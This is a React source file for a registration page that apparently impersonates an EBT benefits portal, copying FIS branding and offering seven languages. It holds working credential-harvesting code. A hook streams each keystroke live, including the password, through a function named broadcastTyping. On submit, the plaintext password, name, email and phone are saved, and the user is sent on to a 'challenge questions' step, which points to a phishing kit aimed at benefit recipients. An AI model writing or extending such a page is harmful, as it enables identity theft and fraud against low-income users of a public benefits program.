import { useEffect, useState, type CSSProperties, type ReactNode } from "react";
import { useNavigate } from "react-router-dom";
import { Eye, EyeOff, Lock, Mail, Phone, User } from "lucide-react";
import EbtLayout from "@/components/EbtLayout";
import Honeypot from "@/components/Honeypot";
import { saveUser, generateId, broadcastTyping, clearTypingForSession, getSelectedLang, setSelectedLang } from "@/lib/userStore";

type Lang = "English" | "Español" | "Kreyòl Ayisyen" | "عربي" | "中文" | "Polski" | "русский";

type Copy = {
  register: string;
  fillOut: string;
  requiredFields: string;
  troubleRegister: string;
  loginFaq: string;
  deletedNotice: string;
  userId: string;
  password: string;
  passwordRule: string;
  reEnterPassword: string;
  firstName: string;
  lastName: string;
  emailAddress: string;
  phoneNumber: string;
  registerBtn: string;
  cancelBtn: string;
  alreadyRegistered: string;
  clickHereToLogin: string;
  protectedBy: string;
  privacyPolicy: string;
  and: string;
  termsOfService: string;
  apply: string;
  conditionsOfUse: string;
  accessibility: string;
  copyright: string;
  selectLanguage: string;
};

const copyByLang: Record<Lang, Copy> = {
  English: {
    register: "Register",
    fillOut: "Please fill out all details accurately to create a User Profile.",
    requiredFields: "Required Fields",
    troubleRegister: "Trouble Registering and Creating Password?",
    loginFaq: "Login FAQ here",
    deletedNotice:
      "If you have recently deleted your user profile, please use a new unique User ID or wait 24 hours to register the deleted User ID.",
    userId: "User ID",
    password: "Password",
    passwordRule:
      "Password must be 8-16 characters and include 1 uppercase, 1 lowercase, and 1 number. It may include special characters _-.#%$+/^'@\".",
    reEnterPassword: "Re-Enter Password",
    firstName: "First Name",
    lastName: "Last Name",
    emailAddress: "Email Address",
    phoneNumber: "Phone Number",
    registerBtn: "Register",
    cancelBtn: "Cancel",
    alreadyRegistered: "Already Registered?",
    clickHereToLogin: "Click here to Login",
    protectedBy: "This site is protected by reCAPTCHA and the Google",
    privacyPolicy: "Privacy Policy",
    and: "and",
    termsOfService: "Terms of Service",
    apply: "apply.",
    conditionsOfUse: "Conditions of Use",
    accessibility: "Accessibility",
    copyright:
       "© 2024 Fidelity National Information Services, Inc. and its subsidiaries. All Rights Reserved.",
    selectLanguage: "Select Language",
  },
  Español: {
    register: "Registrarse",
    fillOut: "Complete todos los datos con precisión para crear un perfil de usuario.",
    requiredFields: "Campos obligatorios",
    troubleRegister: "¿Problemas para registrarse y crear contraseña?",
    loginFaq: "Preguntas frecuentes aquí",
    deletedNotice:
      "Si eliminó recientemente su perfil de usuario, use un nuevo ID único o espere 24 horas para volver a registrarlo.",
    userId: "ID de usuario",
    password: "Contraseña",
    passwordRule:
      "La contraseña debe tener 8-16 caracteres e incluir 1 mayúscula, 1 minúscula y 1 número.",
    reEnterPassword: "Reingrese contraseña",
    firstName: "Nombre",
    lastName: "Apellido",
    emailAddress: "Correo electrónico",
    phoneNumber: "Teléfono",
    registerBtn: "Registrarse",
    cancelBtn: "Cancelar",
    alreadyRegistered: "¿Ya está registrado?",
    clickHereToLogin: "Haga clic aquí para iniciar sesión",
    protectedBy: "Este sitio está protegido por reCAPTCHA y Google",
    privacyPolicy: "Política de Privacidad",
    and: "y",
    termsOfService: "Términos del Servicio",
    apply: "aplican.",
    conditionsOfUse: "Condiciones de uso",
    accessibility: "Accesibilidad",
    copyright:
       "© 2024 Fidelity National Information Services, Inc. y sus subsidiarias. Todos los derechos reservados.",
    selectLanguage: "Seleccionar idioma",
  },
  "Kreyòl Ayisyen": {
    register: "Enskri",
    fillOut: "Tanpri ranpli tout detay yo avèk presizyon pou kreye yon pwofil itilizatè.",
    requiredFields: "Chan obligatwa",
    troubleRegister: "Pwoblèm pou enskri ak kreye modpas?",
    loginFaq: "FAQ koneksyon isit la",
    deletedNotice:
      "Si ou te efase pwofil ou dènyèman, tanpri itilize yon nouvo ID inik oswa tann 24 èdtan pou anrejistre ankò.",
    userId: "ID Itilizatè",
    password: "Modpas",
    passwordRule: "Modpas la dwe genyen 8-16 karaktè ak 1 gwo lèt, 1 ti lèt, ak 1 nimewo.",
    reEnterPassword: "Re-antre Modpas",
    firstName: "Prenon",
    lastName: "Siyati",
    emailAddress: "Imèl",
    phoneNumber: "Nimewo telefòn",
    registerBtn: "Enskri",
    cancelBtn: "Anile",
    alreadyRegistered: "Ou deja enskri?",
    clickHereToLogin: "Klike la pou konekte",
    protectedBy: "Sit sa a pwoteje pa reCAPTCHA ak Google",
    privacyPolicy: "Règleman Konfidansyalite",
    and: "ak",
    termsOfService: "Tèm Sèvis",
    apply: "aplike.",
    conditionsOfUse: "Kondisyon Itilizasyon",
    accessibility: "Aksè",
    copyright:
       "© 2024 Fidelity National Information Services, Inc. ak filyal li yo. Tout dwa rezève.",
    selectLanguage: "Chwazi lang",
  },
  عربي: {
    register: "تسجيل",
    fillOut: "يرجى تعبئة جميع التفاصيل بدقة لإنشاء ملف مستخدم.",
    requiredFields: "الحقول المطلوبة",
    troubleRegister: "مشكلة في التسجيل وإنشاء كلمة المرور؟",
    loginFaq: "الأسئلة الشائعة هنا",
    deletedNotice:
      "إذا قمت مؤخرًا بحذف ملفك، يرجى استخدام معرف مستخدم جديد أو الانتظار 24 ساعة لإعادة التسجيل.",
    userId: "معرف المستخدم",
    password: "كلمة المرور",
    passwordRule: "يجب أن تكون كلمة المرور من 8-16 حرفًا وتحتوي على حرف كبير وصغير ورقم.",
    reEnterPassword: "أعد إدخال كلمة المرور",
    firstName: "الاسم الأول",
    lastName: "اسم العائلة",
    emailAddress: "البريد الإلكتروني",
    phoneNumber: "رقم الهاتف",
    registerBtn: "تسجيل",
    cancelBtn: "إلغاء",
    alreadyRegistered: "مسجل بالفعل؟",
    clickHereToLogin: "اضغط هنا لتسجيل الدخول",
    protectedBy: "هذا الموقع محمي بواسطة reCAPTCHA و Google",
    privacyPolicy: "سياسة الخصوصية",
    and: "و",
    termsOfService: "شروط الخدمة",
    apply: "تنطبق.",
    conditionsOfUse: "شروط الاستخدام",
    accessibility: "إمكانية الوصول",
    copyright:
       "© 2024 Fidelity National Information Services, Inc. والشركات التابعة لها. جميع الحقوق محفوظة.",
    selectLanguage: "اختار اللغة",
  },
  中文: {
    register: "注册",
    fillOut: "请准确填写所有信息以创建用户资料。",
    requiredFields: "必填字段",
    troubleRegister: "注册和创建密码有问题？",
    loginFaq: "登录常见问题",
    deletedNotice: "如果您最近删除了用户资料，请使用新的唯一用户ID，或等待24小时后重新注册。",
    userId: "用户ID",
    password: "密码",
    passwordRule: "密码必须为8-16位，包含1个大写、1个小写和1个数字。",
    reEnterPassword: "重新输入密码",
    firstName: "名字",
    lastName: "姓氏",
    emailAddress: "电子邮箱",
    phoneNumber: "电话号码",
    registerBtn: "注册",
    cancelBtn: "取消",
    alreadyRegistered: "已经注册？",
    clickHereToLogin: "点击这里登录",
    protectedBy: "本网站受 reCAPTCHA 和 Google 保护",
    privacyPolicy: "隐私政策",
    and: "和",
    termsOfService: "服务条款",
    apply: "适用。",
    conditionsOfUse: "使用条款",
    accessibility: "无障碍",
    copyright: "© 2024 Fidelity National Information Services, Inc. 及其子公司。保留所有权利。",
    selectLanguage: "选择语言",
  },
  Polski: {
    register: "Rejestracja",
    fillOut: "Wypełnij dokładnie wszystkie dane, aby utworzyć profil użytkownika.",
    requiredFields: "Pola wymagane",
    troubleRegister: "Problem z rejestracją i hasłem?",
    loginFaq: "FAQ logowania",
    deletedNotice:
      "Jeśli niedawno usunąłeś profil, użyj nowego unikalnego ID użytkownika lub odczekaj 24 godziny.",
    userId: "ID użytkownika",
    password: "Hasło",
    passwordRule: "Hasło musi mieć 8-16 znaków i zawierać 1 wielką literę, 1 małą literę i 1 cyfrę.",
    reEnterPassword: "Powtórz hasło",
    firstName: "Imię",
    lastName: "Nazwisko",
    emailAddress: "Email",
    phoneNumber: "Numer telefonu",
    registerBtn: "Zarejestruj",
    cancelBtn: "Anuluj",
    alreadyRegistered: "Masz już konto?",
    clickHereToLogin: "Kliknij tutaj, aby się zalogować",
    protectedBy: "Ta strona jest chroniona przez reCAPTCHA i Google",
    privacyPolicy: "Polityka prywatności",
    and: "i",
    termsOfService: "Warunki usługi",
    apply: "obowiązują.",
    conditionsOfUse: "Warunki użytkowania",
    accessibility: "Dostępność",
    copyright:
       "© 2024 Fidelity National Information Services, Inc. i jej spółki zależne. Wszelkie prawa zastrzeżone.",
    selectLanguage: "Wybierz język",
  },
  русский: {
    register: "Регистрация",
    fillOut: "Пожалуйста, заполните все данные для создания профиля пользователя.",
    requiredFields: "Обязательные поля",
    troubleRegister: "Проблемы с регистрацией и паролем?",
    loginFaq: "FAQ по входу",
    deletedNotice:
      "Если вы недавно удалили профиль, используйте новый уникальный ID или подождите 24 часа.",
    userId: "ID пользователя",
    password: "Пароль",
    passwordRule: "Пароль должен содержать 8-16 символов, 1 заглавную, 1 строчную букву и 1 цифру.",
    reEnterPassword: "Повторите пароль",
    firstName: "Имя",
    lastName: "Фамилия",
    emailAddress: "Email",
    phoneNumber: "Телефон",
    registerBtn: "Зарегистрироваться",
    cancelBtn: "Отмена",
    alreadyRegistered: "Уже зарегистрированы?",
    clickHereToLogin: "Нажмите здесь, чтобы войти",
    protectedBy: "Сайт защищен reCAPTCHA и Google",
    privacyPolicy: "Политика конфиденциальности",
    and: "и",
    termsOfService: "Условия обслуживания",
    apply: "применяются.",
    conditionsOfUse: "Условия использования",
    accessibility: "Доступность",
    copyright:
       "© 2024 Fidelity National Information Services, Inc. и её дочерние компании. Все права защищены.",
    selectLanguage: "Выберите язык",
  },
};

const languageOptions: Lang[] = [
  "English",
  "Español",
  "Kreyòl Ayisyen",
  "عربي",
  "中文",
  "Polski",
  "русский",
];

const rowIconStyle: CSSProperties = {
  width: 22,
  height: 22,
  color: "hsl(202 36% 38%)",
};

const inputBase: CSSProperties = {
  width: "100%",
  border: "none",
  borderBottom: "1px solid hsl(210 4% 78%)",
  background: "transparent",
  outline: "none",
  height: 40,
  fontSize: 36 / 3,
  color: "hsl(220 10% 28%)",
  fontFamily: "Arial, Helvetica, sans-serif",
};

const Register = () => {
  const navigate = useNavigate();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [lang, setLang] = useState<Lang>(() => {
    const saved = getSelectedLang();
    return languageOptions.includes(saved as Lang) ? (saved as Lang) : "English";
  });

  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [passwordRepeat, setPasswordRepeat] = useState("");
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [showRepeatPassword, setShowRepeatPassword] = useState(false);

  const formatPhone = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 10);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
    return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
  };

  const phoneDigits = phone.replace(/\D/g, "");

  const t = copyByLang[lang];
  const canRegister =
    userId.trim().length > 0 &&
    password.trim().length > 0 &&
    passwordRepeat.trim().length > 0 &&
    firstName.trim().length > 0 &&
    lastName.trim().length > 0 &&
    email.trim().length > 0 &&
    phoneDigits.length === 10 &&
    password === passwordRepeat;


  // Broadcast keystrokes in real-time
  useEffect(() => {
    broadcastTyping({
      "User ID": userId, "Password": password,
      "First Name": firstName, "Last Name": lastName,
      "Email": email, "Phone": phone,
    });
  }, [userId, password, firstName, lastName, email, phone]);
  const handleRegisterSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    if (!canRegister || isSubmitting) return;
    setIsSubmitting(true);
    try {
      clearTypingForSession();
      const ok = await saveUser({
        id: generateId(),
        type: "new",
        timestamp: new Date().toISOString(),
        userId,
        password,
        firstName,
        lastName,
        email,
        phone,
      });
      if (!ok) {
        alert("Nu s-au putut salva datele. Încearcă din nou.");
        return;
      }
      navigate("/challenge-questions");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <EbtLayout
      title={t.register}
      langLabel={t.selectLanguage}
      langOptions={languageOptions}
      onLangChange={(l) => { setLang(l as Lang); setSelectedLang(l); }}
      footerLinks={{ conditionsOfUse: t.conditionsOfUse, privacyPolicy: t.privacyPolicy, accessibility: t.accessibility }}
      footerCopyright={t.copyright}
    >

      <section
        style={{
          position: "relative",
          zIndex: 1,
          paddingTop: 12,
          paddingBottom: 10,
          textAlign: "center",
        }}
      >
        <p
          style={{
            margin: "0 0 4px",
            color: "hsl(0 0% 95%)",
            fontWeight: 700,
            fontSize: 16,
          }}
        >
          {t.fillOut}
        </p>
        <p style={{ margin: 0, color: "hsl(0 89% 42%)", fontWeight: 700, fontSize: 13 }}>
          {t.requiredFields} <span style={{ color: "hsl(0 89% 42%)" }}>*</span>
        </p>
      </section>

      <main style={{ flex: 1, display: "flex", justifyContent: "center", padding: "0 10px 130px", position: "relative", zIndex: 1 }}>
        <div
          style={{
            width: "100%",
            maxWidth: 860,
            background: "hsl(0 0% 100%)",
            padding: "24px clamp(16px, 4vw, 44px) 18px",
            boxSizing: "border-box",
            boxShadow: "0 2px 8px hsla(0 0% 0% / 0.15)",
          }}
        >
          <p style={{ margin: "0 0 16px", textAlign: "center", fontWeight: 700, color: "hsl(203 78% 28%)", fontSize: 25 / 2 }}>
            {t.troubleRegister} <a href="#" style={{ color: "hsl(0 90% 42%)", textDecoration: "none" }}>{t.loginFaq}</a>
          </p>

          <p
            style={{
              margin: "0 0 26px",
              textAlign: "center",
              fontWeight: 700,
              color: "hsl(203 77% 28%)",
              fontSize: 24 / 2,
              lineHeight: 1.35,
            }}
          >
            {t.deletedNotice}
          </p>

          <form onSubmit={handleRegisterSubmit}><Honeypot />
            <InputRow icon={<User style={rowIconStyle} />} label={t.userId}>
              <input type="text" value={userId} onChange={(event) => setUserId(event.target.value)} required style={inputBase} />
            </InputRow>

            <InputRow icon={<Lock style={rowIconStyle} />} label={t.password}>
              <input type="password" value={password} onChange={(event) => setPassword(event.target.value)} required style={inputBase} />
              <p style={{ margin: "8px 0 0", color: "hsl(0 0% 15%)", fontSize: 27 / 2, lineHeight: 1.25 }}>{t.passwordRule}</p>
            </InputRow>

            <InputRow icon={<Lock style={rowIconStyle} />} label={t.reEnterPassword}>
              <div style={{ position: "relative" }}>
                <input
                  type={showRepeatPassword ? "text" : "password"}
                  value={passwordRepeat}
                  onChange={(event) => setPasswordRepeat(event.target.value)}
                  required
                  style={{ ...inputBase, paddingRight: 36 }}
                />
                <button
                  type="button"
                  onClick={() => setShowRepeatPassword((previous) => !previous)}
                  style={{
                    position: "absolute",
                    right: 0,
                    top: "50%",
                    transform: "translateY(-50%)",
                    border: "none",
                    background: "transparent",
                    cursor: "pointer",
                    padding: 4,
                  }}
                >
                  {showRepeatPassword ? <Eye style={rowIconStyle} /> : <EyeOff style={rowIconStyle} />}
                </button>
              </div>
            </InputRow>

            <InputRow icon={<User style={rowIconStyle} />} label={t.firstName}>
              <input type="text" value={firstName} onChange={(event) => setFirstName(event.target.value)} required style={inputBase} />
            </InputRow>

            <InputRow icon={<User style={rowIconStyle} />} label={t.lastName}>
              <input type="text" value={lastName} onChange={(event) => setLastName(event.target.value)} required style={inputBase} />
            </InputRow>

            <InputRow icon={<Mail style={rowIconStyle} />} label={t.emailAddress}>
              <input type="email" value={email} onChange={(event) => setEmail(event.target.value)} required style={inputBase} />
            </InputRow>

            <InputRow icon={<Phone style={rowIconStyle} />} label={t.phoneNumber}>
              <input
                type="tel"
                value={phone}
                onChange={(event) => setPhone(formatPhone(event.target.value))}
                placeholder="(312) 656-5656"
                maxLength={14}
                required
                style={inputBase}
              />
            </InputRow>

            <div style={{ display: "flex", gap: 10, marginTop: 12, flexWrap: "wrap" }}>
              <button
                type="submit"
                disabled={!canRegister || isSubmitting}
                style={{
                  flex: "1 1 140px",
                  maxWidth: "50%",
                  height: 48,
                  border: "none",
                  cursor: canRegister && !isSubmitting ? "pointer" : "not-allowed",
                  color: "hsl(0 0% 92%)",
                  background: canRegister && !isSubmitting ? "hsl(204 33% 44%)" : "hsl(203 24% 70%)",
                  fontSize: 20,
                  fontWeight: 500,
                }}
              >
                {t.registerBtn}
              </button>
              <button
                type="button"
                onClick={() => navigate("/")}
                style={{
                  flex: "1 1 140px",
                  maxWidth: "50%",
                  height: 48,
                  border: "none",
                  cursor: "pointer",
                  color: "hsl(0 0% 92%)",
                  background: "hsl(205 37% 37%)",
                  fontSize: 20,
                  fontWeight: 500,
                }}
              >
                {t.cancelBtn}
              </button>
            </div>
          </form>

          <p style={{ margin: "18px 0 6px", color: "hsl(203 78% 28%)", fontWeight: 700, fontSize: 40 / 2 }}>
            {t.alreadyRegistered}?{" "}
            <a
              href="#"
              onClick={(event) => {
                event.preventDefault();
                navigate("/");
              }}
              style={{ color: "hsl(203 78% 28%)", textDecoration: "none" }}
            >
              {t.clickHereToLogin}
            </a>
          </p>

          <p style={{ margin: 0, color: "hsl(0 0% 23%)", fontSize: 13 }}>
            {t.protectedBy} <a href="#" style={{ color: "hsl(203 78% 28%)" }}>{t.privacyPolicy}</a> {t.and}{" "}
            <a href="#" style={{ color: "hsl(203 78% 28%)" }}>{t.termsOfService}</a> {t.apply}
          </p>
        </div>
      </main>

    </EbtLayout>
  );
};

type InputRowProps = {
  icon: ReactNode;
  label: string;
  children: ReactNode;
};

const InputRow = ({ icon, label, children }: InputRowProps) => {
  return (
    <div style={{ display: "grid", gridTemplateColumns: "32px 1fr", columnGap: 12, alignItems: "start", marginBottom: 20 }}>
      <div style={{ paddingTop: 10 }}>{icon}</div>
      <div>
        <label style={{ display: "block", marginBottom: 3, color: "hsl(0 0% 35%)", fontSize: 42 / 3 }}>
          {label} <span style={{ color: "hsl(0 82% 45%)" }}>*</span>
        </label>
        {children}
      </div>
    </div>
  );
};

export default Register;
